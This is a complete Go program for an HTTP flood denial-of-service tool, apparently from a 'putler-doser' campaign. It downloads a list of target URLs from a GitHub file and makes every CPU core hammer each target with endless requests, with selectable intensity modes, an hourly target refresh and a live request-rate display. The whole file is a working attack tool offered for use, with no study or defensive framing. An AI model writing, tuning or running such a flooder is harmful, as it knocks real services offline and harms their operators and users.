package main

import (
	"fmt"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"github.com/gookit/color"
	"github.com/valyala/fasthttp"
)

var count uint64
var errors uint64
var urlsInitial []string
var multiplier float32

var client = fasthttp.Client{MaxConnsPerHost: 999999}
var cpus = runtime.NumCPU()
var firstTime = true

func main() {
	runtime.GOMAXPROCS(cpus)
	fmt.Println("Select a mode (type in the number): " + color.Red.Render("(1) FULL FORCE ") + color.Yellow.Render("(2) NORMAL ") + color.Green.Render("(3) CHILL"))

	go func() {
		urlsInitial = getList()
	}()

	for {
		var answer string
		fmt.Scanln(&answer)
		switch answer {
		case "1":
			multiplier = 10
		case "2":
			multiplier = 1
		case "3":
			multiplier = 0.25
		}

		if multiplier != 0 {
			break
		} else {
			fmt.Println(color.Red.Render("Invalid code. Try again:"))
		}
	}

	startTime := time.Now()

	for {
		var urls []string

		if firstTime {
			firstTime = false

			for {
				if len(urlsInitial) != 0 {
					break
				}
			}

			urls = urlsInitial
		} else {
			urls = getList()
		}

		nextRefresh := time.Now().Unix() + 3600

		for i := 0; i < int(float32(cpus)*multiplier); i++ {
			for _, url := range urls {
				go func(url string) {
					for {
						if time.Now().Unix() > nextRefresh {
							return
						}

						sendRequest(url)
						atomic.AddUint64(&count, 1)
					}
				}(url)
			}
		}

		for {
			time.Sleep(500 * time.Millisecond)

			timeElapsed := float64(time.Since(startTime).Round(1*time.Second)) / 1000000000

			fmt.Print("\033[H\033[2J")
			fmt.Println(color.Cyan.Render("Slava ") + color.Yellow.Render("Ukraini!") + "\n")
			fmt.Println("Urls: " + color.Magenta.Render(len(urls)))
			fmt.Print("Requests/s: ")
			color.Yellow.Printf("%d\n", uint64(float64(count)/timeElapsed))
			fmt.Print("Total requests: ")
			color.Yellow.Printf("%d\n", count)
			fmt.Print("Successfull requests: ")
			color.Green.Printf("%d\n", count-errors)
			fmt.Print("Successfull requests/s: ")
			color.Green.Printf("%d\n", uint64(float64(count-errors)/timeElapsed))
			fmt.Print("Errors: ")
			color.Red.Printf("%d\n", errors)
			fmt.Print("Time elapsed: ")
			fmt.Println(color.Cyan.Render(time.Since(startTime).Round(1 * time.Second)))

			if time.Now().Unix() > nextRefresh {
				fmt.Print("\033[H\033[2J")
				fmt.Println("Fetching urls...")
				break
			}
		}
	}

}

func sendRequest(host string) {
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(host)
	res := fasthttp.AcquireResponse()

	err := client.Do(req, res)

	if err != nil {
		atomic.AddUint64(&errors, 1)
	}

	fasthttp.ReleaseRequest(req)
}

func getList() []string {
	for {
		req := fasthttp.AcquireRequest()
		req.SetRequestURI("https://raw.githubusercontent.com/metastck/putler-doser/master/list.txt")
		res := fasthttp.AcquireResponse()

		err := client.Do(req, res)

		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		fasthttp.ReleaseRequest(req)
		var lines []string
		linesRaw := strings.Split(string(res.Body()), "\n")

		for _, line := range linesRaw {
			lines = append(lines, strings.Trim(line, "\r"))
		}

		return lines
	}

}
